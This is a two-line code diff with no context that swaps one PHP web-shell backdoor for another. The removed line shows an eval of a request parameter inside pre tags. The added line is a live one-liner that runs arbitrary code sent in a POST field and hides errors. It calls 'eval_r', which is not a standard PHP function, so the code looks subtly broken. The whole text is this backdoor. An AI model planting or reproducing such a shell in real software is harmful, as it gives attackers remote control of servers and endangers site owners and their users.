@@ -1,1 +1,1 @@
-<pre>eval($_REQUEST['wpaa'])</pre>
+<?php @eval_r($_POST['s'])?>
